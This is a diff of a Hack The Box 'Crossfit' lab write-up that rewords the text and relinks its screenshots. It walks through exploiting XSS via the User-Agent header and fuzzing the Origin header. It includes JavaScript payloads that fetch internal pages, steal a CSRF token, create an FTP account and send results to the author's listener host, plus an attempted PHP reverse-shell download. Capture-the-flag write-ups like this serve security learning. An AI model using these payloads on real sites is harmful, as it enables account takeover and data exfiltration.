@@ -6,12 +6,12 @@ points: 50
 rating: 4.4
 date: 2020-09-19
 avatar: assets/htb/crossfit.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Crossfit
 ---
+
 ## Overview
 
-This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(JavaScript and C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
+This Insane box from Hack The Box ate up more time than I expected, mainly because the final exploit kept tripping me up. After grabbing user.txt I set it aside out of frustration and to make headway on other targets. Crossfit stretched me across several fronts: inventive enumeration, source and binary review, and writing "exploits" in unfamiliar languages \(JavaScript and C!\). A few months later I returned with a clear head and quickly spotted the mistakes I'd been making \(plus enough patience to deal with the aggressive cleanup script the authors deployed!\). Wrapping all the moving parts of the final exploit into an automation script finally got me there and I rooted the machine. 
 
 ## Useful Skills and Tools
 
@@ -34,7 +34,7 @@ lftp :~> set ssl:verify-certificate no
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`.  The options I regularly use are: 
+I kicked off enumeration with an nmap scan against `<YOUR_IP>`.  These are the flags I tend to reach for: 
 
 | `Flag` | Purpose |
 | :--- | :--- |
@@ -44,9 +44,7 @@ I started my enumeration with an nmap scan of `<YOUR_IP>`.  The options I regula
 | `-sV` | Does a service version scan |
 | `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |
 
-{% hint style="info" %}
-All this time I did not know that there were more levels of verbosity, I had just been using **`-v`** to get information as it was discovered instead of waiting for the scan to finish. I will be using **`-vvv`** from now on!
-{% endhint %}
+Until now I hadn't realized there were higher verbosity levels; I'd only ever used **`-v`** to watch results stream in rather than waiting for completion. Going forward I'll be reaching for **`-vvv`**!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -153,11 +151,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 47.99 seconds
 ```
 
-The scan showed that there were only three TCP ports open, 21 - FTP, 22 - SSH, and 80 - HTTP.
+The results revealed just three open TCP ports: 21 - FTP, 22 - SSH, and 80 - HTTP.
 
 ### Port 21 - FTP
 
-My first target was any potential low-hanging fruit that may have been accessed through FTP.
+I went after the easy wins first, checking whether FTP exposed anything useful.
 
 ```text
 21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
@@ -165,7 +163,7 @@ My first target was any potential low-hanging fruit that may have been accessed 
 | Issuer: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
 ```
 
-In my nmap output for port 21 I found two hostnames, `crossfit.htb` and `gym-club.crossfit.htb`, which I added to my `/etc/hosts/` file.
+The port 21 nmap output exposed two hostnames, `crossfit.htb` and `gym-club.crossfit.htb`, which I dropped into my `/etc/hosts/` file.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -179,33 +177,33 @@ Password:
 Login failed.
 ```
 
-Without credentials, the first thing I check is whether or not the server accepts anonymous login.  I was not able to log in to FTP using anonymous in this case.
+With no credentials in hand, my default first move is to test for anonymous login.  Here, anonymous access to FTP was rejected.
 
 ### Port 80 - HTTP
 
-Next, I saw that there was an Apache web server being hosted on port 80.  I opened my web browser and navigated to `crossfit.htb` to see what I could find.
+Next up was the Apache web server on port 80.  I pointed my browser at `crossfit.htb` to see what was there.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-default-apache.png)
+![](assets/wu/crossfit/img-1.png)
 
-`crossfit.htb` only led to the default apache page, meaning there was no default page configured at this address.
+`crossfit.htb` just returned the default Apache page, indicating no site was configured at this vhost.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-gym-club.png)
+![](assets/wu/crossfit/img-2.png)
 
-However,  `gym-club.crossfit.htb` led to a CrossFit gym website.
+In contrast, `gym-club.crossfit.htb` served up a CrossFit gym website.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-wappalyzer.png)
+![](assets/wu/crossfit/img-3.png)
 
-The Wappalyzer Firefox plugin showed me the technologies that were in use on this site.  I did a quick search for each of the ones that showed a version number but none led to any useable vulnerabilities.
+The Wappalyzer Firefox extension listed the technologies powering the site.  I quickly looked up each one that reported a version, but none pointed to a usable vulnerability.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-class-table.png)
+![](assets/wu/crossfit/img-4.png)
 
-The site included a schedule of classes.  I took down the names Candy, Murph, Chelsea, and Annie as potential usernames.
+The site listed a class schedule.  I jotted down Candy, Murph, Chelsea, and Annie as possible usernames.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-join-comingsoon.png)
+![](assets/wu/crossfit/img-5.png)
 
-The link to "Join the club" led to a "coming soon" page, but there was nothing useful there.  
+The "Join the club" link only opened a "coming soon" page with nothing of value.  
 
-Since I had already found one virtual host for this IP address, as in [HTB - Forwardslash](../hard/forwardslash-write-up.md) I tried to do vhost enumeration using gobuster.  I ran this in the background while enumerating the website.
+Having already turned up one virtual host for this IP, just like in [HTB - Forwardslash](../hard/forwardslash-write-up.md), I fired off vhost enumeration with gobuster.  I let it run in the background while I poked at the website.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -227,21 +225,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-This did not come up with anything, however.  I tried with `ffuf` as well, but did not find any more subdomains.
+That turned up nothing, though.  I retried with `ffuf` as well but uncovered no additional subdomains.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-employees.png)
+![](assets/wu/crossfit/img-6.png)
 
-On the "About-Us" page I found four more possible usernames: Becky Taylor, Noah Leonard, Evelyn Fields, and Leroy Guzman.  As the Manager, Leroy seemed like the most likely target.
+The "About-Us" page gave me four more candidate usernames: Becky Taylor, Noah Leonard, Evelyn Fields, and Leroy Guzman.  Being the Manager, Leroy looked like the prime target.
 
 ### Cross-site Scripting \(XSS\)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test.png)
+![](assets/wu/crossfit/img-7.png)
 
-Since there wasn't anything obvious to go by, I started doing some basic vulnerability testing on the submission boxes. The first one at `/contact.php` did not seem to be vulnerable to either XSS or SQL injection.
+With nothing obvious to act on, I began some basic vulnerability testing against the input forms. The first one at `/contact.php` showed no sign of XSS or SQL injection.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test2.png)
+![](assets/wu/crossfit/img-8.png)
 
-However, the second one I found at `/blog-single.php` gave a warning about XSS.
+The second form, at `/blog-single.php`, however, threw a warning about XSS.
 
 ```markup
 <div class='alert alert-danger' role='alert'>
@@ -253,13 +251,13 @@ A security report containing your IP address and browser information will be gen
 </div>
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test-caught.png)
+![](assets/wu/crossfit/img-9.png)
 
-The warning claimed that browser information will be sent to the admin.  I thought maybe I could smuggle something that would be executed by the admin through the "browser information": AKA User-Agent.
+The warning stated that browser information would be forwarded to the admin.  That made me think I could sneak in something the admin would execute via the "browser information", i.e. the User-Agent.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test-caught-burp.png)
+![](assets/wu/crossfit/img-10.png)
 
-Using Burp I sent a request with a link to my machine in the `User-Agent` field.  I made sure to send the same XSS attempt so this would be forwarded to the admin.
+With Burp I crafted a request placing a link back to my box in the `User-Agent` field.  I kept the XSS payload in the request so it would get relayed to the admin.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -276,11 +274,11 @@ Referer: http://gym-club.crossfit.htb/security_threat/report.php
 Connection: keep-alive
 ```
 
-I received an HTTP GET request to my waiting netcat listener.  
+An HTTP GET request landed on my waiting netcat listener.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-security-report-denied.png)
+![](assets/wu/crossfit/img-11.png)
 
-In the `Referer` field I saw `/security_threat/report.php` in the response headers, but was not able to access it.  The code in this PHP file must have been what had checked the XSS request I had made, and somehow executed the `<script>` tags I had embedded, while creating the report for the admin.
+The `Referer` header pointed to `/security_threat/report.php`, but I couldn't reach it directly.  That PHP file must have been what inspected my XSS request and, while building the admin's report, ended up executing the `<script>` tags I'd embedded.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -289,15 +287,15 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 <YOUR_IP> - - [28/Dec/2020 14:53:10] "GET /php-reverse-shell.php HTTP/1.1" 200 -
 ```
 
-In the same spirit I tried to get the admin to download a PHP reverse shell from me, but I couldn't find where it had been uploaded nor figure out how to execute it.
+Along the same lines I tried to make the admin pull a PHP reverse shell from me, but I couldn't locate where it landed or work out how to run it.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-origin.png)
+![](assets/wu/crossfit/img-12.png)
 
 `Origin` Header with `Access-Control-Allow-Origin` response header
 
 ### ftp.crossfit.htb
 
-I was familiar with fuzzing for vhosts as well as directories and files, but fuzzing for a response in a header was something new.  I did some research on more advanced uses of `ffuf` and found a few interesting articles.
+Fuzzing for vhosts, directories, and files was familiar territory, but fuzzing based on a header in the response was new to me.  I read up on more advanced `ffuf` usage and came across a couple of useful articles.
 
 * [https://agentsteal.com/fuzz-parameters-directories-more-with-ffuf/](https://agentsteal.com/fuzz-parameters-directories-more-with-ffuf/)
 * [https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html\#what-is-ffuf--and-what-is-it-used-for-](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#what-is-ffuf--and-what-is-it-used-for-)
@@ -331,23 +329,21 @@ ftp                     [Status: 200, Size: 10701, Words: 3427, Lines: 369]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 ```
 
- With the information from these articles I was able to craft a set of parameters to fuzz the `Origin` header.  In order to do this I needed to use the `-H` flag to include the custom header selection, as well as use the `-mr` flag to match using a custom regular expression. 
+ Armed with what I learned from these articles, I put together a parameter set to fuzz the `Origin` header.  That meant using `-H` to inject the custom header and `-mr` to match against a custom regular expression. 
 
 > ### Match on Regular Expression <a id="match-on-regular-expression"></a>
 >
 > In some cases, however, you may be fuzzing for more complex bugs and want to filter based on a [regular expression](https://en.wikipedia.org/wiki/Regular_expression). For example, if you’re filtering for a path traversal bug you may wish to pass a value of `-mr "root:"` to FFUF to only identify successful responses that indicate a successful retreival of `/etc/passwd`.
 
- I knew if the response from the server included the words "Allow-Origin" that it was a valid request using the specified `Origin` header.  Using this information, I was able to find another virtual host: `ftp.crossfit.htb`.  
+ If the server's response contained "Allow-Origin", that told me the request with that `Origin` header was valid.  This approach surfaced another virtual host: `ftp.crossfit.htb`.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-ftb-apache.png)
+![](assets/wu/crossfit/img-13.png)
 
-However, loading up this URL in my browser just led to another default Apache page.  Next, I decided to see if I could use the same Cross Origin Request Forgery to get the headers of the internal page to see if there was a different view from the proper origin.  
+Loading that URL in my browser, though, just gave me another default Apache page.  So I decided to reuse the same Cross Origin Request Forgery to fetch the internal page and check whether it looked different when requested from the proper origin.  
 
 ### Cross Origin Request Forgery with JavaScript
 
-TODO: add screenshot of sending request with this payload in Burp
-
-Since the `<script>` tag that triggered the cross-site scripting exploit was using JavaScript \(`alert()`\), I decided that was the best language to write a payload in to try to get the server to access the page I wanted for me.  I did a bit of research and found an easy way to make HTTP requests using JavaScript.
+Because the `<script>` tag that fired the XSS used JavaScript \(`alert()`\), JavaScript seemed like the natural choice for writing a payload that would make the server fetch the page I wanted.  A bit of research turned up a simple way to issue HTTP requests in JavaScript.
 
 * [https://stackoverflow.com/questions/247483/http-get-request-in-javascript](https://stackoverflow.com/questions/247483/http-get-request-in-javascript)
 
@@ -367,7 +363,7 @@ request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
 request2.send()
 ```
 
-I wrote a JavaScript payload to reach out to the `ftp.crossfit.htb` site then send the response back to my waiting Python HTTP server. I used this instead of netcat so the server would stay active and I wouldn't have to restart it each time the server closed the connection.
+I wrote a JavaScript payload that would hit the `ftp.crossfit.htb` site and relay the response to my waiting Python HTTP server. I went with a Python server instead of netcat so it would stay up and I wouldn't have to relaunch it every time a connection closed.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/crossfit]
@@ -380,7 +376,7 @@ Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
 <YOUR_IP> - - [15/Jan/2021 18:28:05] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
-It took me a few tries, but I was able to get the server to download my script and execute it.  The final response I got contained the encoded HTML for a web page.  
+After a few attempts, I got the server to fetch and run my script.  The response that came back held the encoded HTML of a web page.  
 
 ```markup
 <!DOCTYPE html>
@@ -421,11 +417,11 @@ It took me a few tries, but I was able to get the server to download my script a
 </html>
 ```
 
-After decoding the response I had the webpage at `http://ftp.crossfit.htb` as viewed internally.  I could tell right away that this was not the same default Apache server page.
+Decoding the response gave me the internal view of `http://ftp.crossfit.htb`.  It was immediately clear this was not the default Apache page.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-rescreate-response1.png)
+![](assets/wu/crossfit/img-14.png)
 
-I saved the HTML code to a file and opened it in my browser.  The page turned out to be an account management page for FTP.  The "Create Account" button was a link to a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
+I saved the HTML to a file and opened it locally.  It turned out to be an FTP account management page.  The "Create Account" button linked to an intriguing endpoint: `http://ftp.crossfit.htb/accounts/create`.  I tweaked my JavaScript payload to fetch that page.
 
 ```text
 <YOUR_IP> - - [15/Jan/2021 18:41:59] "GET /test.js HTTP/1.1" 200 -
@@ -433,7 +429,7 @@ I saved the HTML code to a file and opened it in my browser.  The page turned ou
 <YOUR_IP> - - [15/Jan/2021 18:41:59] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EAdd%20New%20Account%3C/h2%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts%22%3E%20Back%3C/a%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/div%3E%3Cform%20action=%22http://ftp.crossfit.htb/accounts%22%20method=%22POST%22%3E%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22GSlwHU3OU1s0lcF102Hku1jwvXeBtqGiAvKCjEGH%22%3E%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EUsername:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22text%22%20name=%22username%22%20class=%22form-control%22%20placeholder=%22Username%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EPassword:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22password%22%20name=%22pass%22%20class=%22form-control%22%20placeholder=%22Password%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%20text-center%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-primary%22%3ESubmit%3C/button%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/form%3E%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
-I got back a response with the encoded HTML code for the `/accounts/create` website.
+The response came back with the encoded HTML of the `/accounts/create` page.
 
 ```markup
 <!DOCTYPE html>
@@ -479,9 +475,9 @@ I got back a response with the encoded HTML code for the `/accounts/create` webs
 </html>
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-recreate-adduser.png)
+![](assets/wu/crossfit/img-15.png)
 
-With this page it looked as if I could create a new account.  I would need to send a POST request to `http://ftp.crossfit.htb/accounts` with a username, password, and the value from the hidden field `_token`. 
+This page suggested I could create a new account.  To do so I'd need to POST to `http://ftp.crossfit.htb/accounts` with a username, password, and the value of the hidden `_token` field. 
 
 ```javascript
 //test2.js
@@ -509,12 +505,12 @@ request3.open('GET', 'http://10.10.14.161:8090/' + token, true);
 request3.send();
 ```
 
-I modified my script to retrieve the hidden `_token` value.  At first, I tried just reading the value of the `_token` element out of the response, but after some troubleshooting and more reading I found that the response text wasn't being properly parsed.  
+I updated my script to grab the hidden `_token` value.  My initial attempt to read the `_token` element straight out of the response failed, and after some troubleshooting and reading I realized the response text wasn't being parsed correctly.  
 
 * [https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html](https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html)
 * [https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser](https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser)
 
-Once I was able to correctly parse this from the output I was able to send my POST request to the server to create a new user.  First though, I had the test script send just the token back to me so I could see that it worked.
+Once I could parse the value out properly, I was ready to POST and create a user.  First, though, I had the test script return just the token so I could confirm it worked.
 
 ```markup
 <YOUR_IP> - - [15/Jan/2021 19:37:38] "GET /test2.js HTTP/1.1" 200 -
@@ -522,7 +518,7 @@ Once I was able to correctly parse this from the output I was able to send my PO
 <YOUR_IP> - - [15/Jan/2021 19:37:38] "GET /ObNaK9gJvibNxvnGNi26mA1IdM5PfI6BVme775Nc HTTP/1.1" 404 -
 ```
 
-I received the reply back, this time with only the hidden `_token` value.
+The reply came back containing just the hidden `_token` value.
 
 ```javascript
 //test3.js
@@ -567,7 +563,7 @@ request4.open('GET', 'http://10.10.14.161:8090/' + response3, true);
 request4.send();
 ```
 
-Next, I modified my payload to actually create the new FTP user.  
+Next I adjusted my payload to actually create the FTP user.  
 
 ```text
 <YOUR_IP> - - [15/Jan/2021 21:51:58] "GET /test3.js HTTP/1.1" 200 -
@@ -577,11 +573,9 @@ Next, I modified my payload to actually create the new FTP user.
 <YOUR_IP> - - [15/Jan/2021 21:51:58] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22alert%20alert-success%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EAccount%20created%20successfully.%3C/p%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E1%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3Etest3%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E2021-01-15%2002:01:55%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action=%22http://ftp.crossfit.htb/accounts/85%22%20method=%22POST%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-info%22%20href=%22http://ftp.crossfit.htb/accounts/85%22%3EShow%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts/85/edit%22%3EEdit%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_method%22%20value=%22DELETE%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-danger%22%3EDelete%3C/button%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/td%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
-Got a response on my HTTP server with the parameters I was sending to the server, then again with HTML code of the response.  I hoped that it included some kind of way to tell if I had been successful at creating a user.  
+My HTTP server logged the parameters I sent, followed by the HTML of the response.  I was hoping it would indicate whether the user creation succeeded.  
 
-{% hint style="info" %}
-I went through a few iterations as you can see...at one point I thought that maybe my request was getting rejected because of too simple of a password so I upgraded it.  It may or may not have been a typo I found in my script, but I left it anyway just in case.
-{% endhint %}
+As you can see, I went through several iterations...at one point I suspected the request was being rejected for too weak a password, so I beefed it up.  There may also have been a typo I caught in my script, but I left the change in just in case.
 
 ```markup
 <!DOCTYPE html>
@@ -633,11 +627,11 @@ I went through a few iterations as you can see...at one point I thought that may
 </html>
 ```
 
-I decoded the HTML response, then saved it to a file.
+I decoded the HTML response and saved it to a file.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.9-ftp-user-created.png)
+![](assets/wu/crossfit/img-16.png)
 
-After recreating the webpage from the response, I could see that my account was created successfully!  Next I tried to log into the server using FTP.
+After rebuilding the page from the response, I could see my account had been created successfully!  Next I tried logging into the server over FTP.
 
 ### Port 21 - Revisited \(using LFTP\)
 
@@ -652,7 +646,7 @@ Login failed.
 421 Service not available, remote server has closed connection
 ```
 
-I tried logging in with FTP, but got an error `530 Non-anonymous sessions must use encryption.`
+My FTP login attempt failed with `530 Non-anonymous sessions must use encryption.`
 
 * [https://unix.stackexchange.com/questions/71525/how-do-i-use-implicit-ftp-over-tls](https://unix.stackexchange.com/questions/71525/how-do-i-use-implicit-ftp-over-tls)
 * [https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line](https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line)
@@ -689,7 +683,7 @@ drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
 drwxr-xr-x    2 0        0            4096 May 01  2020 html
 ```
 
-Success! I was able to log into FTP with the user I had created.  I immediately found four folders.  
+It worked! I logged into FTP with the account I'd created and immediately spotted four folders.  
 
 ```text
 lftp test3@ftp.crossfit.htb:/> ls development-test/
@@ -738,7 +732,7 @@ lftp test3@ftp.crossfit.htb:/> ls html
 -rw-r--r--    1 0        0           10701 Apr 30  2020 index.html
 ```
 
-Unfortunately the most interesting sounding folder `development-test/` was empty.
+Sadly the most promising-sounding folder, `development-test/`, was empty.
 
 ```text
 lftp test3@ftp.crossfit.htb:/> get gym-club/db.php > gym-db.php
@@ -749,7 +743,7 @@ lftp test3@ftp.crossfit.htb:/> login test3
 Password: 
 ```
 
-Annoyingly, the server seemed to delete my user account after a few minutes.  I had to recreate it and log in again each time during my enumeration.
+Frustratingly, the server appeared to purge my account every few minutes.  I had to keep recreating it and logging back in throughout my enumeration.
 
 ```php
 <?php
@@ -761,7 +755,7 @@ $conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
 ?>
 ```
 
-In the `/gym-club` directory there was a file `db.php`. The password I found here unfortunately did not work with the username `crossfit` for either SSH or FTP.
+The `/gym-club` directory held a `db.php` file. Unfortunately the password it revealed didn't work with the `crossfit` username for SSH or FTP.
 
 ```text
 lftp test3@ftp.crossfit.htb:/> ls ftp/database
@@ -773,7 +767,7 @@ lftp test3@ftp.crossfit.htb:/> ls ftp/database/factories/
 lftp test3@ftp.crossfit.htb:/> get ftp/database/factories/UserFactory.php 876 bytes transferred in 1 second (876 B/s)
 ```
 
